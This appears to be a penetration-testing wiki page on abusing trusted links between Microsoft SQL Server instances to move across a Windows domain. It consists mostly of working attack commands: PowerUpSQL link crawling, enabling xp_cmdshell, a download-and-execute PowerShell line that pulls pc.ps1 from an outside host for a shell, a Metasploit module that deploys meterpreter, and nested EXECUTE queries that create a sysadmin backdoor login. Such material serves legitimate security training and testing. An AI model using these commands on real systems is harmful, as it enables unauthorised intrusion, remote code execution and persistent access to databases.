# MSSQL Trusted Links

## MSSQL Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host \(if running as SA\).   
Also, if a MSSQL instance is trusted \(database link\) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.

**The links between databases work even across forest trusts.**

### **Powershell**

```bash
Import-Module .\PowerupSQL.psd1

#Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test

## FROM INSIDE OF THE DOMAIN
#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose 

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting form the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
```

### Metasploit

You can easily check for trusted links using metasploit.

```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```

Notice that metasploit will try to abuse only the `openquery()` function in MSSQL \(so, if you can't execute command with `openquery()` you will need to try the `EXECUTE` method **manually** to execute commands, see more below.\)

### Manual - Openquery\(\)

From Linux you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py** and run queries like:

```bash
select * from openquery("DOMINIO\SERVER1",'select * from openquery("DOMINIO\SERVER2",''select * from master..sysservers'')')
```

From Windows you could also find the links and execute commands manually using a MSSQL client like [HeidiSQL](https://www.heidisql.com/)

_Login using Windows authentication:_

![](../../.gitbook/assets/image%20%28289%29.png)

_Find links inside the accessible MSSQL server \(in this case the link is to dcorp-sql1\):_  
`select * from master..sysservers`

![](../../.gitbook/assets/image%20%28315%29.png)

Execute queries through the link \(example: find more links in the new accessible instance\):  
`select * from openquery("dcorp-sql1", 'select * from master..sysservers')`

![](../../.gitbook/assets/image%20%28298%29.png)

You can continue these trusted links chain forever manually.

Some times you won't be able to perform actions like `exec xp_cmdshell` from `openquery()` in those cases it might be worth it to test the following method:

### Manual - EXECUTE

You can also abuse trusted links using EXECUTE:

```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```



